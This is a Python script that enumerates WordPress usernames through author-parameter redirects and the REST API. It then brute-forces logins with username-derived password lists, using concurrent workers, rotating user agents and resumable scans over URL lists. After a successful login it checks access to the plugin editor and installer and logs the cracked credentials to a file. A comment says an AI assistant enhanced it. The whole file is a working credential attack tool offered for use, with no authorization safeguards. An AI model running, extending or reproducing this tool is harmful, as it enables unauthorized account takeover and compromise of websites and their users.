#!/usr/bin/env python3

import requests
import re
import argparse
import concurrent.futures
import urllib3
from urllib.parse import urlparse
import sys
import time
import random
from colorama import Fore, Style, init
import os
from datetime import datetime
import json

#script by Chirag Artani
#enhanced by Claude with additional features

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # Initialize colorama

# List of user agents to rotate through
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
]

# List of possible login paths to try
LOGIN_PATHS = [
    '/wp-login.php',
    '/blog/wp-login.php',
    '/wp/wp-login.php',
    '/wordpress/wp-login.php',
    '/cms/wp-login.php',
    '/backup/wp-login.php',
    '/old/wp-login.php',
    '/new/wp-login.php',
    '/main/wp-login.php',
    '/site/wp-login.php',
    '/wp/login.php',
    '/admin/wp-login.php'
]

def parse_args():
    parser = argparse.ArgumentParser(description='WordPress Username Enumeration and Password Brute Force')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t', '--target', help='Target URL (e.g., http://example.com)')
    group.add_argument('-l', '--url-list', help='File containing list of target URLs (one per line)')
    parser.add_argument('-o', '--output', help='Output file for successful logins', default='wp_successful_logins.txt')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers per target (default: 10)')
    parser.add_argument('-s', '--site-workers', type=int, default=5, help='Number of concurrent sites to scan (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--only-enumerate', action='store_true', help='Only enumerate usernames, skip brute force')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--resume', action='store_true', help='Resume from where the script last stopped')
    parser.add_argument('--state-file', default='wp_scanner_state.json', help='State file for resuming (default: wp_scanner_state.json)')
    return parser.parse_args()

def normalize_url(url):
    """Normalize URL by ensuring it has a scheme and ends without a trailing slash."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"

def get_random_user_agent():
    """Return a random user agent from the list"""
    return random.choice(USER_AGENTS)

def print_status(message, status='info'):
    """Print status messages with color coding and timestamp"""
    status_colors = {
        'info': Fore.BLUE,
        'success': Fore.GREEN,
        'error': Fore.RED,
        'warning': Fore.YELLOW
    }
    color = status_colors.get(status, Fore.WHITE)
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"[{timestamp}] {color}[{status.upper()}]{Style.RESET_ALL} {message}")

def find_working_login_path(url, timeout):
    """Find a working login path from the predefined list of paths"""
    print_status(f"Finding working login path for {url}")
    
    for path in LOGIN_PATHS:
        try:
            login_url = f"{url}{path}"
            headers = {'User-Agent': get_random_user_agent()}
            response = requests.get(login_url, timeout=timeout, verify=False, headers=headers, allow_redirects=True)
            
            # More comprehensive check for WordPress login page
            # Check status code and various patterns that appear in WP login pages
            if response.status_code == 200 and any(pattern in response.text for pattern in [
                'wp-login',
                'user_login',
                'wp-submit',
                'Log In',
                'Username or Email Address',
                'Password',
                'Remember Me',
                'Lost your password?',
                'wordpress_test_cookie',
                '<input type="password"',
                'name="log"',
                'name="pwd"'
            ]):
                print_status(f"Found working login path: {path} for {url}", "success")
                return path
        except requests.RequestException as e:
            print_status(f"Error checking {login_url}: {str(e)}", "error") if 'timeout' not in str(e).lower() else None
            continue
    
    # Double-check the default wp-login.php path with a more lenient detection
    try:
        default_path = '/wp-login.php'
        login_url = f"{url}{default_path}"
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(login_url, timeout=timeout, verify=False, headers=headers, allow_redirects=True)
        
        # If status code is 200 and it has a form, it's likely a login page
        if response.status_code == 200 and '<form' in response.text and 'password' in response.text.lower():
            print_status(f"Found default login path with lenient detection: {default_path} for {url}", "success")
            return default_path
    except requests.RequestException:
        pass
    
    print_status(f"No working login path found for {url}", "error")
    return None

def enum_from_author_param(url, timeout, delay=0):
    """Enumerate users from /?author=X parameter"""
    users = set()

    # Try author parameter for the first few users
    for i in range(1, 5):
        try:
            author_url = f"{url}/?author={i}"
            headers = {'User-Agent': get_random_user_agent()}

            response = requests.get(author_url, allow_redirects=False, timeout=timeout, verify=False, headers=headers)

            # Check for redirect to author page
            if response.status_code in (301, 302) and 'location' in response.headers:
                location = response.headers['location']
                matches = re.search(r'/author/([^/]+)', location)
                if matches:
                    username = matches.group(1)
                    users.add(username)
                    print_status(f"Found username via redirect: {username} on {url}", "success")

            # Add delay if specified
            if delay > 0:
                time.sleep(delay)

            # Check for author info in body
            headers = {'User-Agent': get_random_user_agent()}
            body_response = requests.get(author_url, timeout=timeout, verify=False, headers=headers)
            if body_response.status_code == 200:
                for pattern in [r'author-\w+">([a-z0-9_-]+)<', r'/author/([a-z0-9_-]+)/', r'"slug":"([a-z0-9_-]+)"', r'"username":"([a-z0-9_-]+)"']:
                    matches = re.findall(pattern, body_response.text)
                    for username in matches:
                        users.add(username)
                        print_status(f"Found username in body: {username} on {url}", "success")

            # Add delay if specified
            if delay > 0:
                time.sleep(delay)

        except requests.RequestException as e:
            print_status(f"Error while checking author={i} on {url}: {str(e)}", "error")

    return users

def enum_from_rest_api(url, timeout, delay=0):
    """Enumerate users from WP REST API"""
    users = set()

    try:
        api_url = f"{url}/wp-json/wp/v2/users"
        headers = {'User-Agent': get_random_user_agent()}

        response = requests.get(api_url, timeout=timeout, verify=False, headers=headers)

        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list):
                    for user in data:
                        if 'slug' in user:
                            username = user['slug']
                            users.add(username)
                            print_status(f"Found username via REST API: {username} on {url}", "success")
                        if 'username' in user:
                            username = user['username']
                            users.add(username)
                            print_status(f"Found username via REST API: {username} on {url}", "success")
            except ValueError:
                pass  # Not valid JSON

    except requests.RequestException as e:
        print_status(f"Error while checking REST API on {url}: {str(e)}", "error")

    return users

def enumerate_usernames(url, timeout, delay=0):
    """Enumerate WordPress usernames using various methods"""
    print_status(f"Enumerating usernames from {url}")

    users = set()
    users.update(enum_from_author_param(url, timeout, delay))
    users.update(enum_from_rest_api(url, timeout, delay))

    if not users:
        print_status(f"No usernames found on {url}", "warning")
    else:
        print_status(f"Found {len(users)} unique username(s) on {url}: {', '.join(users)}", "info")

    return users

def get_password_list(username):
    """Generate password list for a given username"""
    common_suffixes = ['123', '123456', 'admin123', 'admin12345', 'password123', 'admin888', '12345678']
    common_passwords = ['admin123', 'admin12345', 'password123', 'admin888', '123456', '12345678']

    passwords = [username]  # The username itself
    passwords.extend([username + suffix for suffix in common_suffixes])
    passwords.extend(common_passwords)

    return passwords

def try_login(url, login_path, username, password, timeout, delay=0):
    """Attempt to login to WordPress with given credentials"""
    session = requests.Session()
    login_url = f"{url}{login_path}"

    try:
        # Get login page first to set cookies
        headers = {'User-Agent': get_random_user_agent()}
        session.get(login_url, timeout=timeout, verify=False, headers=headers)

        if delay > 0:
            time.sleep(delay)

        # Prepare login data
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        response = session.post(login_url, data=login_data, headers=headers,
                              allow_redirects=False, timeout=timeout, verify=False)

        # Check for successful login (302 redirect with login cookies)
        if response.status_code == 302:
            cookie_header = response.headers.get('Set-Cookie', '')
            if 'wordpress_logged_in' in cookie_header or any(cookie.name.startswith('wordpress_logged_in') for cookie in session.cookies):
                return True

        return False

    except requests.RequestException:
        return False

def check_plugin_access(url, login_path, username, password, timeout):
    """Check if the credentials have access to plugins page or wp-plugin.php"""
    session = requests.Session()
    login_url = f"{url}{login_path}"
    plugin_urls = [
        f"{url}/wp-admin/plugins.php",
        f"{url}/wp-admin/plugin-install.php",
        f"{url}/wp-admin/plugin-editor.php"
    ]

    try:
        # Get login page first to set cookies
        headers = {'User-Agent': get_random_user_agent()}
        session.get(login_url, timeout=timeout, verify=False, headers=headers)

        # Prepare login data
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Cookie': 'wordpress_test_cookie=WP Cookie check',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        response = session.post(login_url, data=login_data, headers=headers,
                             allow_redirects=True, timeout=timeout, verify=False)

        # Check if login was successful
        if 'wp-admin' in response.url:
            accessible_plugins = []

            # Check each plugin URL for access
            for plugin_url in plugin_urls:
                try:
                    plugin_response = session.get(plugin_url, timeout=timeout, verify=False,
                                              headers={'User-Agent': get_random_user_agent()})

                    # Check if we have access (HTTP 200 and not redirected to login)
                    if plugin_response.status_code == 200 and 'wp-login.php' not in plugin_response.url:
                        # Verify it's actually the plugins page by checking content
                        if 'plugins.php' in plugin_url and ('add_new' in plugin_response.text or 'plugin-title' in plugin_response.text):
                            accessible_plugins.append('plugins.php')
                        elif 'plugin-install.php' in plugin_url and ('plugin-install-tab' in plugin_response.text or 'upload-plugin' in plugin_response.text):
                            accessible_plugins.append('plugin-install.php')
                        elif 'plugin-editor.php' in plugin_url and ('theme-editor-textarea' in plugin_response.text or 'plugin-editor' in plugin_response.text):
                            accessible_plugins.append('plugin-editor.php')

                except requests.RequestException:
                    continue

            return accessible_plugins

        return []

    except requests.RequestException:
        return []

def write_success(output_file, url, username, password):
    """Write successful login to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        f.write(f"[{timestamp}] {url} - {username}:{password}\n")

def write_plugin_access(output_file, url, username, password, accessible_plugins):
    """Write plugin access information to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        plugins_str = ', '.join(accessible_plugins) if accessible_plugins else "No plugin access"
        f.write(f"[{timestamp}] {url} - {username}:{password} - Plugin Access: {plugins_str}\n")

def save_state(state_file, targets_completed, targets_to_process, current_usernames=None, current_url=None):
    """Save the current state to a file for resuming later"""
    state = {
        'targets_completed': list(targets_completed),
        'targets_to_process': list(targets_to_process),
        'current_url': current_url,
        'current_usernames': list(current_usernames) if current_usernames else None,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    with open(state_file, 'w') as f:
        json.dump(state, f)
    
    print_status(f"State saved to {state_file}", "info")

def load_state(state_file):
    """Load the state from a file for resuming"""
    try:
        with open(state_file, 'r') as f:
            state = json.load(f)
        
        print_status(f"Loaded state from {state_file} (saved at {state.get('timestamp', 'unknown')})", "info")
        
        # Initialize with defaults for any missing fields
        result = {
            'targets_completed': set(state.get('targets_completed', [])),
            'targets_to_process': list(state.get('targets_to_process', [])),
            'current_url': state.get('current_url'),
            'current_usernames': set(state.get('current_usernames', [])) if state.get('current_usernames') else None
        }
        return result
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print_status(f"No valid state file found at {state_file}: {str(e)}", "warning")
        return {
            'targets_completed': set(),
            'targets_to_process': [],
            'current_url': None,
            'current_usernames': None
        }
    except Exception as e:
        print_status(f"Error loading state file: {str(e)}", "error")
        print_status(f"Starting with fresh state", "info")
        return {
            'targets_completed': set(),
            'targets_to_process': [],
            'current_url': None,
            'current_usernames': None
        }

def brute_force_users(url, login_path, usernames, timeout, workers, verbose, output_file, delay=0, state_file=None):
    """Brute force WordPress login for the enumerated usernames"""
    if not usernames:
        return []

    print_status(f"Starting brute force against {len(usernames)} username(s) on {url} with {workers} workers")

    successful_logins = []
    total_attempts = 0
    
    # Save state before starting brute force
    if state_file:
        save_state(state_file, set(), [], usernames, url)

    # Create futures for all login attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []

        for username in usernames:
            passwords = get_password_list(username)
            print_status(f"Queuing {len(passwords)} passwords for username '{username}' on {url}")

            for password in passwords:
                future = executor.submit(try_login, url, login_path, username, password, timeout, delay)
                futures.append((future, username, password))

        for future, username, password in futures:
            if username in [login.split(':')[0] for login in successful_logins]:
                # Skip if we already found credentials for this username
                future.cancel()
                continue

            total_attempts += 1

            try:
                result = future.result()
                if result:
                    credential = f"{username}:{password}"
                    successful_logins.append(credential)
                    print_status(f"✓ SUCCESS: {url} - {credential}", "success")

                    # Check for plugin access
                    print_status(f"Checking plugin access for {url} - {credential}", "info")
                    accessible_plugins = check_plugin_access(url, login_path, username, password, timeout)

                    if accessible_plugins:
                        print_status(f"🔌 PLUGIN ACCESS: {url} - {credential} - Access to: {', '.join(accessible_plugins)}", "success")
                    else:
                        print_status(f"🔌 NO PLUGIN ACCESS: {url} - {credential}", "warning")

                    # Write to file immediately
                    write_success(output_file, url, username, password)
                    write_plugin_access(output_file, url, username, password, accessible_plugins)

                    # Cancel remaining futures for this username
                    for f, u, p in futures:
                        if u == username and not f.done():
                            f.cancel()

                elif verbose:
                    print_status(f"✗ Failed: {url} - {username}:{password}", "warning")

            except Exception as e:
                if verbose:
                    print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
                
            # Periodically update state (e.g., after each 10 attempts)
            if state_file and total_attempts % 10 == 0:
                remaining_usernames = set([u for f, u, p in futures if not f.done() and u not in [login.split(':')[0] for login in successful_logins]])
                save_state(state_file, set(), [], remaining_usernames, url)

    print_status(f"Brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
    return successful_logins

def process_single_site(url, args, targets_completed=None):
    """Process a single WordPress site"""
    if targets_completed is None:
        targets_completed = set()
        
    normalized_url = normalize_url(url)
    
    # Skip if already completed
    if normalized_url in targets_completed:
        print_status(f"Skipping {normalized_url} - already processed", "info")
        return []

    try:
        # Find a working login path
        login_path = find_working_login_path(normalized_url, args.timeout)
        if not login_path:
            # Allow manual path override if detection fails
            print_status(f"No login path automatically detected for {normalized_url}.", "warning")
            print_status(f"Trying default /wp-login.php path anyway...", "info")
            login_path = "/wp-login.php"  # Use default path as fallback

        usernames = enumerate_usernames(normalized_url, args.timeout, args.delay)

        if not usernames:
            print_status(f"No usernames found to brute force on {normalized_url}. Skipping.", "warning")
            targets_completed.add(normalized_url)
            if args.state_file:
                save_state(args.state_file, targets_completed, [], None, None)
            return []

        if args.only_enumerate:
            print_status(f"Username enumeration completed for {normalized_url}. Skipping brute force as requested.", "info")
            targets_completed.add(normalized_url)
            if args.state_file:
                save_state(args.state_file, targets_completed, [], None, None)
            return []

        results = brute_force_users(normalized_url, login_path, usernames, args.timeout, args.workers, args.verbose, args.output, args.delay, args.state_file if args.resume else None)
        targets_completed.add(normalized_url)
        
        # Update state after completion
        if args.state_file:
            save_state(args.state_file, targets_completed, [], None, None)
            
        return results

    except Exception as e:
        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return []

def process_url_list(url_list_file, args):
    """Process multiple WordPress sites from a URL list file"""
    # Load state if resuming
    state = {'targets_completed': set(), 'targets_to_process': []}
    if args.resume:
        state = load_state(args.state_file)
    
    # Load URLs
    if not state['targets_to_process']:
        try:
            with open(url_list_file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
                state['targets_to_process'] = urls
        except Exception as e:
            print_status(f"Error reading URL list file: {str(e)}", "error")
            sys.exit(1)

    # Filter out already completed targets
    urls_to_process = [url for url in state['targets_to_process'] if normalize_url(url) not in state['targets_completed']]
    
    # Resume from current URL if available
    current_idx = 0
    if state.get('current_url') and state['current_url'] in urls_to_process:
        try:
            current_idx = urls_to_process.index(state['current_url'])
            urls_to_process = urls_to_process[current_idx:]
        except ValueError:
            # Current URL not found in list, start from beginning
            pass

    print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
    print_status(f"Already completed: {len(state['targets_completed'])} URLs")

    # Create output file with header if not resuming
    if not args.resume or not os.path.exists(args.output):
        with open(args.output, 'w') as f:
            f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Format: [Timestamp] URL - username:password\n")
            f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")

    # Process URLs sequentially to better support resuming
    all_successful_logins = []
    for url in urls_to_process:
        try:
            # Update current URL in state
            if args.state_file:
                save_state(args.state_file, state['targets_completed'], urls_to_process, None, url)
                
            successful_logins = process_single_site(url, args, state['targets_completed'])
            all_successful_logins.extend(successful_logins)
            
        except KeyboardInterrupt:
            print_status("\nOperation interrupted. State saved for resuming later.", "warning")
            if args.state_file:
                save_state(args.state_file, state['targets_completed'], urls_to_process, None, url)
            sys.exit(1)
        except Exception as e:
            print_status(f"Error processing URL {url}: {str(e)}", "error")
            continue

    # Final summary
    print_status(f"\n{'='*50}")
    print_status(f"SCAN COMPLETE - {len(all_successful_logins)} successful logins found", "success")
    print_status(f"Results saved to {args.output}")
    print_status(f"{'='*50}")

def main():
    args = parse_args()

    try:
        # Create output directory if it doesn't exist
        output_dir = os.path.dirname(args.output)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)

        if args.url_list:
            process_url_list(args.url_list, args)
        else:
            # Single target processing
            normalized_url = normalize_url(args.target)
            
            # Check if we're resuming
            targets_completed = set()
            if args.resume:
                state = load_state(args.state_file)
                targets_completed = state['targets_completed']
            
            # Initialize output file if not resuming
            if not args.resume or not os.path.exists(args.output):
                with open(args.output, 'w') as f:
                    f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("# Format: [Timestamp] URL - username:password\n")
                    f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")

            successful_logins = process_single_site(args.target, args, targets_completed)

            if successful_logins and not args.only_enumerate:
                print_status(f"\n{'='*50}")
                print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
                for login in successful_logins:
                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                print_status(f"Results saved to {args.output}")
                print_status(f"{'='*50}")

    except KeyboardInterrupt:
        print_status("\nOperation cancelled by user. Saving state for resuming later.", "warning")
        if args.state_file:
            save_state(args.state_file, set(), [args.target], None, args.target)
        sys.exit(1)
    except Exception as e:
        print_status(f"An unexpected error occurred: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    main()
